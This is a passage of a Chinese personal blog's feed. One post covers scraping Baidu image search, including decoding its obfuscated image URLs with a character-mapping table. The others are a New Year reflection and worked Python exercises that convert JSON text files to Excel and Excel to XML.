<p>#百度搜索<br>爬取百度搜索的照片就稍微复杂了一些，因为百度做了相应的反爬机制，在用浏览器浏览的时候会发现：<br><img src="http://ww1.sinaimg.cn/large/dcfd67b5gw1f0575tuju5j20ik08qq6f.jpg" alt=""><br>然后按照之前的方法继续爬取的时候，会发现并只爬取到了少量的图片<br>回过头来看看怎么传输的，F12后查看network：<br>每往下拉去鼠标，发现会收到json数据：<br><img src="http://ww2.sinaimg.cn/large/dcfd67b5gw1f057641j2yj20y90bhwhd.jpg" alt=""><br>点击后发现：<br><img src="http://ww1.sinaimg.cn/large/dcfd67b5gw1f0576dgbbdj20ss09tdju.jpg" alt=""><br>随便访问一个图片，便得到了对应的照片。<br>我们点击发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">1: &#123;thumbURL: &quot;http://img2.imgtn.bdimg.com/it/u=605516665,3942838751&amp;fm=206&amp;gp=0.jpg&quot;,…&#125;</div><div class="line">DecorateCompanyGrade: &quot;&quot;</div><div class="line">DecorateCompanyId: &quot;&quot;</div><div class="line">DecorateCompanyLocation: &quot;&quot;</div><div class="line">DecorateCompanyName: &quot;&quot;</div><div class="line">DecorateWantuUrl: &quot;&quot;</div><div class="line">adType: &quot;0&quot;</div><div class="line">bdFromPageTitlePrefix: &quot;&quot;</div><div class="line">bdImgnewsDate: &quot;1970-01-01 08:00&quot;</div><div class="line">bdSetImgNum: 0</div><div class="line">bdSourceName: &quot;&quot;</div><div class="line">bdSrcType: &quot;10&quot;</div><div class="line">cs: &quot;605516665,3942838751&quot;</div><div class="line">currentIndex: &quot;&quot;</div><div class="line">di: &quot;153381291910&quot;</div><div class="line">filesize: &quot;&quot;</div><div class="line">fromPageTitle: &quot;看&lt;strong&gt;王祖贤&lt;/strong&gt;早期的美艳旧照&quot;</div><div class="line">fromURL: &quot;http://www.sznews.com/ent/content/2007-11/28/content_1680244_12.htm&quot;</div><div class="line">fromURLHost: &quot;www.sznews.com&quot;</div><div class="line">hasLarge: true</div><div class="line">height: 450</div><div class="line">hoverURL: &quot;&quot;</div><div class="line">is: &quot;&quot;</div><div class="line">isAspDianjing: false</div><div class="line">largeTnImageUrl: &quot;&quot;</div><div class="line">middleURL: &quot;http://img2.imgtn.bdimg.com/it/u=605516665,3942838751&amp;fm=206&amp;gp=0.jpg&quot;</div><div class="line">objURL: &quot;http://www.sznews.com/ent/images/site3/20071128/02374341116308b703fa28.jpg&quot;</div><div class="line">os: &quot;3424157733,1697100770&quot;</div><div class="line">pageNum: 61</div><div class="line">pi: &quot;0&quot;</div><div class="line">setDowloadURL: &quot;&quot;</div><div class="line">setTittle: &quot;&quot;</div><div class="line">simid: &quot;102628390,940766820&quot;</div><div class="line">source_type: &quot;&quot;</div><div class="line">tagTwo: &quot;&quot;</div><div class="line">thumbURL: &quot;http://img2.imgtn.bdimg.com/it/u=605516665,3942838751&amp;fm=206&amp;gp=0.jpg&quot;</div><div class="line">token: &quot;&quot;</div><div class="line">type: &quot;jpg&quot;</div><div class="line">width: 288</div></pre></td></tr></table></figure></p>
<p>其中middleurl代表着中等比列，thumbURL代表着预览图，objurl代表着原始的图片链接。<br>看到这里应该已经明白了，度娘是将查询出来的图片链接放在js里返回了，需要加载的时候，再去重新请求获得url，从而显示出图片。之所以我们用普通的爬虫去爬取不到更多的图片是因为有规律的列表类数据都会通过JavaScript异步请求服务器获得，服务器通常返回嵌入的HTML代码或者XML代码或者JSON代码，这样的设计能够让结果多次返回，有利于加强用户体验。</p>
<p><strong>这里需要注意的就是大部分的图片的原始链接是被加密过的，并不像上面一样可以直接看到原始数据</strong>，比如我搜索兰博基尼得到下图<br><img src="http://ww4.sinaimg.cn/large/dcfd67b5gw1f0576nv222j20m908qwh4.jpg" alt=""><br>这里需要弄清楚百度是怎么加密的。对比html中的url和这里的objurl。<br>我们再换个女神来试试，发现同样也是被加密过的<br>对比两段代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">0: &#123;adType: &quot;0&quot;, hasAspData: &quot;0&quot;,…&#125;</div><div class="line">adPicId: &quot;0&quot;</div><div class="line">adType: &quot;0&quot;</div><div class="line">bdFromPageTitlePrefix: &quot;&quot;</div><div class="line">bdImgnewsDate: &quot;1970-01-01 08:00&quot;</div><div class="line">bdSetImgNum: 0</div><div class="line">bdSourceName: &quot;&quot;</div><div class="line">bdSrcType: &quot;0&quot;</div><div class="line">cs: &quot;1134918538,3550735636&quot;</div><div class="line">currentIndex: &quot;&quot;</div><div class="line">di: &quot;128020980890&quot;</div><div class="line">face_info: null</div><div class="line">filesize: &quot;&quot;</div><div class="line">fromPageTitle: &quot;&lt;strong&gt;高圆圆&lt;/strong&gt;…_来自zj的图片分享-堆糖网&quot;</div><div class="line">fromPageTitleEnc: &quot;高圆圆…_来自zj的图片分享-堆糖网&quot;</div><div class="line">fromURL: &quot;ippr_z2C$qAzdH3FAzdH3Fooo_z&amp;e3B17tpwg2_z&amp;e3Bv54AzdH3Frj5rsjAzdH3F4ks52AzdH3F88nbndcadAzdH3F1jpwtsAzdH3F?gjxp=8n0nm80b8&quot;</div><div class="line">fromURLHost: &quot;www.duitang.com&quot;</div><div class="line">hasAspData: &quot;0&quot;</div><div class="line">hasLarge: 0</div><div class="line">hasThumbData: &quot;0&quot;</div><div class="line">height: 800</div><div class="line">hoverURL: &quot;http://img4.imgtn.bdimg.com/it/u=1134918538,3550735636&amp;fm=23&amp;gp=0.jpg&quot;</div><div class="line">imgType: &quot;&quot;</div><div class="line">is: &quot;&quot;</div><div class="line">isAspDianjing: 0</div><div class="line">largeTnImageUrl: &quot;&quot;</div><div class="line">middleURL: &quot;http://img4.imgtn.bdimg.com/it/u=1134918538,3550735636&amp;fm=21&amp;gp=0.jpg&quot;</div><div class="line">objURL: &quot;ippr_z2C$qAzdH3FAzdH3Ft429_z&amp;e3B17tpwg2_z&amp;e3Bv54AzdH3F7rs5w1fAzdH3Fks52AzdH3Fda8n8dAzdH3FnaAzdH3Fda8n8dna88cacm_BV9c9_z&amp;e3B3rj2&quot;</div><div class="line">os: &quot;1452914021,398296588&quot;</div><div class="line">pageNum: 60</div><div class="line">simid: &quot;4220450355,717626561&quot;</div><div class="line">simid_info: null</div><div class="line">source_type: &quot;&quot;</div><div class="line">thumbURL: &quot;http://img4.imgtn.bdimg.com/it/u=1134918538,3550735636&amp;fm=21&amp;gp=0.jpg&quot;</div><div class="line">token: &quot;&quot;</div><div class="line">type: &quot;jpeg&quot;</div><div class="line">width: 600</div><div class="line">xiangshi_info: null</div></pre></td></tr></table></figure></p>
<p>和对应到html中的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;li class=&quot;imgitem&quot; style=&quot;width: 190px; height: 254.371px; margin-right: 5px; margin-bottom: 5px; display: list-item;&quot; data-objurl=&quot;http://img4.duitang.com/uploads/blog/201312/30/20131230115056_BV454.jpeg&quot; data-thumburl=&quot;http://img4.imgtn.bdimg.com/it/u=1134918538,3550735636&amp;amp;fm=21&amp;amp;gp=0.jpg&quot; data-fromurl=&quot;ippr_z2C$qAzdH3FAzdH3Fooo_z&amp;amp;e3B17tpwg2_z&amp;amp;e3Bv54AzdH3Frj5rsjAzdH3F4ks52AzdH3F88nbndcadAzdH3F1jpwtsAzdH3F?gjxp=8n0nm80b8&quot; data-fromurlhost=&quot;www.duitang.com&quot; data-ext=&quot;jpeg&quot; data-saved=&quot;0&quot; pn=&quot;60&quot; data-cs=&quot;1134918538,3550735636&quot; data-width=&quot;600&quot; data-height=&quot;800&quot; data-title=&quot;&lt;strong&gt;高圆圆&lt;/strong&gt;…_来自zj的图片分享-堆糖网&quot;&gt;&lt;div class=&quot;imgbox div_1134918538,3550735636&quot;&gt;&lt;a href=&quot;/search/detail?ct=503316480&amp;amp;z=&amp;amp;tn=baiduimagedetail&amp;amp;ipn=d&amp;amp;word=%E9%AB%98%E5%9C%86%E5%9C%86&amp;amp;step_word=&amp;amp;ie=utf-8&amp;amp;in=&amp;amp;cl=2&amp;amp;lm=-1&amp;amp;st=-1&amp;amp;cs=1134918538,3550735636&amp;amp;os=1452914021,398296588&amp;amp;pn=60&amp;amp;rn=1&amp;amp;di=128020980890&amp;amp;ln=1000&amp;amp;fr=&amp;amp;fmq=1453192678424_R&amp;amp;ic=0&amp;amp;s=undefined&amp;amp;se=&amp;amp;sme=&amp;amp;tab=0&amp;amp;width=&amp;amp;height=&amp;amp;face=undefined&amp;amp;is=&amp;amp;istype=2&amp;amp;ist=&amp;amp;jit=&amp;amp;bdtype=0&amp;amp;gsm=0&amp;amp;objurl=http%3A%2F%2Fimg4.duitang.com%2Fuploads%2Fblog%2F201312%2F30%2F20131230115056_BV454.jpeg&quot; target=&quot;_blank&quot; style=&quot;display: block; width: 190px; height: 254px; margin-top: 0px; margin-left: 0px;&quot; name=&quot;pn60&quot;&gt;&lt;img class=&quot;main_img img-hover&quot; src=&quot;http://img4.imgtn.bdimg.com/it/u=1134918538,3550735636&amp;amp;fm=23&amp;amp;gp=0.jpg&quot; style=&quot;width: 190px; height: 254px;&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;/li&gt;</div></pre></td></tr></table></figure></p>
<p>提取objurl<br>加密前为：<br><code>http://img4.duitang.com/uploads/blog/201312/30/20131230115056_BV454.jpeg</code><br>加密后为：<br><code>ippr_z2C$qAzdH3FAzdH3Ft429_z&amp;e3B17tpwg2_z&amp;e3Bv54AzdH3F7rs5w1fAzdH3Fks52AzdH3Fda8n8dAzdH3FnaAzdH3Fda8n8dna88cacm_BV9c9_z&amp;e3B3rj2</code></p>
<p>于是到这一步后我懵*了，我去，怎么办，妈蛋不会啊，本来就是底层狗啊，前端什么的都不会，要不是最近看内核看的头疼，鬼才来无聊写个爬虫爬妹子呢！！！<br>Google一番后，发现自有大神在，好像还是我渣科的学长。这里将映射表引用过来：、</p>
<blockquote>
<p>“0”: “7”,    “1”: “d”,    “2”: “g”,    “3”: “j”,    “4”: “m”,    “5”: “o”,    “6”: “r”,    “7”: “u”,    “8”: “1”,<br>“9”: “4”,    “AzdH3F”: “/“,    “_z2C$q”: “:”,    “_z&amp;e3B”: “.”,    “a”: “0”,    “b”: “8”,    “c”: “5”,<br>“d”: “2”,    “e”: “v”,    “f”: “s”,    “g”: “n”,    “h”: “k”,    “i”: “h”,    “j”: “e”,    “k”: “b”,    “l”: “9”,<br>“m”: “6”,    “n”: “3”,    “o”: “w”,    “p”: “t”,    “q”: “q”,    “r”: “p”,    “s”: “l”,    “t”: “i”,    “u”: “f”,<br>“v”: “c”,    “w”: “a”</p>
</blockquote>
<p><del>被大神学长打的趴在地上起不来，我还是好好的去调我的内核吧</del><br>分析出来后代码也应该很容易写出来了…</p>
<pre><code>
</code></pre><p>#微博<br>听说微博上的妹纸也很多嘛，最主要的是有网红哦，哇哈哈哈，转战微博爬一发。<br>在爬取微博的时候会遇到登陆的限制，这个时候可以抓包后模拟登陆方式，也可以爬取m.weibo</p>
<p>#后<br><em>持续更新中…</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文章写在一段时间之前，这几天考完科目三之后没事会陆续更新到自己的博客上，反正自己很懒，没事的时候就将自己做过的一些笔记扔到博客上，一来是为了回顾，二来是为了总结。&lt;br&gt;关于这篇文章的起因是因为之前的那篇python一日一练的第13题，爬取一个妹子的图片，后来便对python爬取图片有了兴趣（&lt;del&gt;其实我只是为了爬取妹子的皂片呢&lt;/del&gt;），这篇文章讲持续更新关于利用python爬取妹子皂片的代码，敬请关注：&lt;br&gt;
    
    </summary>
    
      <category term="编程" scheme="http://venidic.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://venidic.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>2016,我还是来了</title>
    <link href="http://venidic.com/2016/01/01/2016-%E6%88%91%E8%BF%98%E6%98%AF%E6%9D%A5%E4%BA%86/"/>
    <id>http://venidic.com/2016/01/01/2016-我还是来了/</id>
    <published>2015-12-31T16:00:07.000Z</published>
    <updated>2016-01-01T05:49:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>2015还是就这样走了，很舍不得的这一年发生了很多，年初还在图书馆犹豫着要不要考研的时候凭着运气拿到了腾讯的offer，年中还在感慨着武汉的夏的时候来到了深圳，年末在浑浑噩噩度日的时候去了驾校考了驾证。<br>迎来的16年怎么想还是有些惆怅的，翻了16年的书终究还是要合上了，结识了多年的朋友终究还是要道别了，生活在校园里的少年终究还是要走上社会了，躲在父母臂弯下的孩子终究还是要开始独挡一面了。</p>
<blockquote class="blockquote-center">我们，终究还是长大了！</blockquote>

<p><img src="http://7xieyq.com1.z0.glb.clouddn.com/2016.png" class="full-image"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2015还是就这样走了，很舍不得的这一年发生了很多，年初还在图书馆犹豫着要不要考研的时候凭着运气拿到了腾讯的offer，年中还在感慨着武汉的夏的时候来到了深圳，年末在浑浑噩噩度日的时候去了驾校考了驾证。&lt;br&gt;迎来的16年怎么想还是有些惆怅的，翻了16年的书终究还是要合上了
    
    </summary>
    
      <category term="呓语" scheme="http://venidic.com/categories/%E5%91%93%E8%AF%AD/"/>
    
    
      <category term="随笔" scheme="http://venidic.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>python一日一练（14-21）</title>
    <link href="http://venidic.com/2015/12/31/python%E4%B8%80%E6%97%A5%E4%B8%80%E7%BB%83%EF%BC%8814-21%EF%BC%89/"/>
    <id>http://venidic.com/2015/12/31/python一日一练（14-21）/</id>
    <published>2015-12-31T02:52:00.000Z</published>
    <updated>2016-01-21T02:34:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章是接着上面一篇python一日一练（0-13），之所以分成两个部分倒不是为了增加自己的博客次数，而是发现自己在hexo生成静态博客后deploy到git上时，发现如果自己在之前的文章中做修改的话，hexo无法显示出这篇文章，原因尚不清楚。于是选择重新发一篇总结之后的几个任务。<br><a id="more"></a></p>
<p>#0014</p>
<blockquote>
<p> 纯文本文件 student.txt为学生信息, 里面的内容（包括花括号）如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &quot;1&quot;:[&quot;张三&quot;,150,120,100],</div><div class="line">    &quot;2&quot;:[&quot;李四&quot;,90,99,95],</div><div class="line">    &quot;3&quot;:[&quot;王五&quot;,60,66,68]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
</blockquote>
<p>请将上述内容写到student.xls文件中，如下图所示：<br><img src="index_files/881a654b-a7f0-494d-8329-90b347b9152a.jpg" alt=""></p>
<p>这里作者给出了一份参考资料<br><a href="http://www.cnblogs.com/skynet/archive/2013/05/06/3063245.html" target="_blank" rel="external">python应用与实践</a></p>
<p>这里主要是学会使用python下面的一个xlwt(or xlwt3)这个库，方便将excel表格与各种文件类型进行转换。<br><a href="https://pythonhosted.org/xlwt3/" target="_blank" rel="external">官方说明</a><br>官方实例代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">import xlwt</div><div class="line">from datetime import datetime</div><div class="line"></div><div class="line">style0 = xlwt.easyxf(&apos;font: name Times New Roman, color-index red, bold on&apos;,num_format_str=&apos;#,##0.00&apos;)</div><div class="line">style1 = xlwt.easyxf(num_format_str=&apos;D-MMM-YY&apos;)</div><div class="line"></div><div class="line">wb = xlwt.Workbook()</div><div class="line">ws = wb.add_sheet(&apos;A Test Sheet&apos;)</div><div class="line"></div><div class="line">ws.write(0, 0, 1234.56, style0)</div><div class="line">ws.write(1, 0, datetime.now(), style1)</div><div class="line">ws.write(2, 0, 1)</div><div class="line">ws.write(2, 1, 1)</div><div class="line">ws.write(2, 2, xlwt.Formula(&quot;A3+B3&quot;))</div><div class="line"></div><div class="line">wb.save(&apos;example.xls&apos;)</div></pre></td></tr></table></figure></p>
<p>这里补充一下，在查找资料的时候，发现了这么一个链接，写的挺好的<br><a href="http://www.gocalf.com/blog/python-read-write-excel.html" target="_blank" rel="external">用Python读写Excel文件</a><br>最后的结果如图：<br><img src="index_files/809dd679-18e9-4a19-a69a-c20f0ef0f8c3.png" alt=""><br>针对此题，主要就是解析txt了，题设上的txt格式类似于json，所以可以使用json库来解析文档。<br>官方文档：<a href="https://docs.python.org/2/library/json.html" target="_blank" rel="external">https://docs.python.org/2/library/json.html</a><br>具体参见代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;venidic&apos;</div><div class="line">import xlwt</div><div class="line">import json</div><div class="line">def readtxt(path):</div><div class="line">    with open(path, &apos;r&apos;) as f:</div><div class="line">        content = f.read().decode(&apos;utf-8&apos;)</div><div class="line">        content_json = json.loads(content)</div><div class="line">        print content_json</div><div class="line">    return content_json</div><div class="line"></div><div class="line">def savexls(content, filename):</div><div class="line">    wb = xlwt.Workbook()</div><div class="line">    ws = wb.add_sheet(&apos;Student&apos;)</div><div class="line">    x = 0</div><div class="line">    y = 0</div><div class="line">    for row, col in sorted(content.items(), key = lambda d:d[0]):</div><div class="line">        ws.write(x, y, row)</div><div class="line">        for col_content in col:</div><div class="line">            y += 1</div><div class="line">            ws.write(x, y, col_content)</div><div class="line"></div><div class="line">        x += 1</div><div class="line">        y = 0</div><div class="line">    wb.save(filename)</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    #readtxt(&apos;1.txt&apos;)</div><div class="line">    savexls(readtxt(&apos;1.txt&apos;), &apos;1.xls&apos;)</div></pre></td></tr></table></figure>
<p>#0015</p>
<blockquote>
<p> 纯文本文件 city.txt为城市信息, 里面的内容（包括花括号）如下所示：<br>{<br>    “1” : “上海”,<br>    “2” : “北京”,<br>    “3” : “成都”<br>}<br>请将上述内容写到 city.xls 文件中，如下图所示：<br> <img src="index_files/c64e1ce1-c3b7-402f-ac87-77594a4bbbe6.png" alt=""></p>
</blockquote>
<p>第一眼看上去以为思路一样，运行了下发现出来的结果如图：<br><img src="index_files/06df8183-10ba-4799-865f-d57f1d5bb23e.png" alt=""><br>原来txt的格式稍微有些变化，对应的只用需要将一一读取列的代码去掉就好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;venidic&apos;</div><div class="line">import xlwt</div><div class="line">import json</div><div class="line">def readtxt(path):</div><div class="line">    with open(path, &apos;r&apos;) as f:</div><div class="line">        content = f.read().decode(&apos;utf-8&apos;)</div><div class="line">        content_json = json.loads(content)</div><div class="line">        print content_json</div><div class="line">    return content_json</div><div class="line"></div><div class="line">def savexls(content, filename):</div><div class="line">    wb = xlwt.Workbook()</div><div class="line">    ws = wb.add_sheet(&apos;City&apos;)</div><div class="line">    x = 0</div><div class="line">    y = 0</div><div class="line">    for row, col in sorted(content.items(), key = lambda d:d[0]):</div><div class="line">        ws.write(x, y, row)</div><div class="line">        ws.write(x, y+1, col)</div><div class="line">        x += 1</div><div class="line">        y = 0</div><div class="line">    wb.save(filename)</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    #readtxt(&apos;1.txt&apos;)</div><div class="line">    savexls(readtxt(&apos;1.txt&apos;), &apos;1.xls&apos;)</div></pre></td></tr></table></figure></p>
<p>#0016</p>
<blockquote>
<p>纯文本文件 numbers.txt, 里面的内容（包括方括号）如下所示：<br>[<br>    [1, 82, 65535],<br>    [20, 90, 13],<br>    [26, 809, 1024]<br>]<br>请将上述内容写到 numbers.xls 文件中，如下图所示：<br><img src="index_files/c75c2f19-ccda-4c06-8466-85dd5f8c7d1f.png" alt=""></p>
</blockquote>
<p>这里解析出来的txt为一个列表<br><code>[[1, 82, 65535], [20, 90, 13], [26, 809, 1024]]</code></p>
<p>于是修改相应代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;venidic&apos;</div><div class="line">import xlwt</div><div class="line">import json</div><div class="line">def readtxt(path):</div><div class="line">    with open(path, &apos;r&apos;) as f:</div><div class="line">        content = f.read().decode(&apos;utf-8&apos;)</div><div class="line">        content_json = json.loads(content)</div><div class="line">        print content_json</div><div class="line">    return content_json</div><div class="line"></div><div class="line">def savexls(content, filename):</div><div class="line">    wb = xlwt.Workbook()</div><div class="line">    ws = wb.add_sheet(&apos;City&apos;)</div><div class="line">    x = 0</div><div class="line">    y = 0</div><div class="line">    for row in content:</div><div class="line">        for col in row:</div><div class="line">            ws.write(x, y, col)</div><div class="line">            y += 1</div><div class="line">        x += 1</div><div class="line">        y = 0</div><div class="line">    wb.save(filename)</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    #readtxt(&apos;1.txt&apos;)</div><div class="line">    savexls(readtxt(&apos;1.txt&apos;), &apos;1.xls&apos;)</div></pre></td></tr></table></figure></p>
<p>#0017</p>
<blockquote>
<p>将 第 0014 题中的 student.xls 文件中的内容写到 student.xml 文件中，如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;students&gt;</div><div class="line">&lt;!-- </div><div class="line">    学生信息表</div><div class="line">    &quot;id&quot; : [名字, 数学, 语文, 英文]</div><div class="line">--&gt;</div><div class="line">&#123;</div><div class="line">    &quot;1&quot; : [&quot;张三&quot;, 150, 120, 100],</div><div class="line">    &quot;2&quot; : [&quot;李四&quot;, 90, 99, 95],</div><div class="line">    &quot;3&quot; : [&quot;王五&quot;, 60, 66, 68]</div><div class="line">&#125;</div><div class="line">&lt;/students&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure></p>
</blockquote>
<p>#0018</p>
<blockquote>
<p>将 第 0015 题中的 city.xls 文件中的内容写到 city.xml 文件中，如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?xmlversion=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;citys&gt;</div><div class="line">&lt;!-- </div><div class="line">    城市信息</div><div class="line">--&gt;</div><div class="line">&#123;</div><div class="line">    &quot;1&quot; : &quot;上海&quot;,</div><div class="line">    &quot;2&quot; : &quot;北京&quot;,</div><div class="line">    &quot;3&quot; : &quot;成都&quot;</div><div class="line">&#125;</div><div class="line">&lt;/citys&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure></p>
</blockquote>
<p>这里对xls的解析需要运用xlrd库，对xml的存储需要运用到lxml中的etree，下面是官网文档<br><a href="https://secure.simplistix.co.uk/svn/xlrd/trunk/xlrd/doc/xlrd.html?p=4966" target="_blank" rel="external">xlrd</a><br>上述网址已经被强，需要翻墙<br><a href="http://lxml.de/tutorial.html" title="官方文档" target="_blank" rel="external">etree</a></p>
<p>大体通过<code>xlrd.open_work</code>打开xls文件后，在通过<code>sheet_by_name()</code>打开对应的表单，从而获得一个sheet class对象，关于这个对象我们需要的方法如下：</p>
<blockquote>
<p>nrows [#]<br>Number of rows in sheet. A row index is in range(thesheet.nrows).</p>
<p>row_values(rowx, start_colx=0, end_colx=None) [#]<br>Returns a slice of the values of the cells in the given row.</p>
</blockquote>
<p>将读取的内容存放在一个词典中，然后通过extree保存到xml中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;venidic&apos;</div><div class="line">import xlrd</div><div class="line">from lxml import etree</div><div class="line">import json</div><div class="line">def readxls(path):</div><div class="line">    xls = xlrd.open_workbook(path)</div><div class="line">    xls_sheet  = xls.sheet_by_name(&apos;City&apos;)</div><div class="line">    content = &#123;&#125;</div><div class="line">    for i in range(xls_sheet.nrows):</div><div class="line">        content[xls_sheet.row_values(i)[0]] = xls_sheet.row_values(i)[1]</div><div class="line">    #print content</div><div class="line">    return json.dumps(content, encoding=&apos;utf-8&apos;)</div><div class="line"></div><div class="line">def savexlm(file_name, content):</div><div class="line">    root = etree._Element(&apos;root&apos;)</div><div class="line">    city = etree.SubElement(root, &apos;citys&apos;)</div><div class="line">    city.append(etree.Comment(u&quot;City Information&quot;))</div><div class="line">    city.text = content</div><div class="line"></div><div class="line">    xml = etree.ElementTree(root)</div><div class="line">    xml.write(file_name, pretty_print = True, xml_declaration = True, encoding = &apos;utf-8&apos;)</div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    savexlm(&apos;1.xml&apos;, readxls(&apos;1.xls&apos;))</div></pre></td></tr></table></figure>
<p>#0019<br>与上述两题相似</p>
<p>#0020</p>
<blockquote>
<p> <a href="http://iservice.10010.com/index_.html" target="_blank" rel="external">登陆中国联通网上营业厅</a> 后选择「自助服务」 –&gt; 「详单查询」，然后选择你要查询的时间段，点击「查询」按钮，查询结果页面的最下方，点击「导出」，就会生成类似于 2014年10月01日～2014年10月31日通话详单.xls 文件。写代码，对每月通话时间做个统计。</p>
</blockquote>
<p>无奈没有中国联通的手机，而且移动的看了下也完全不知道怎么导出啊喂</p>
<p>#后<br><em>未完待续</em><br><strong>持续更新中…</strong></p>
]]></content>
    
    <summary type="html">
    
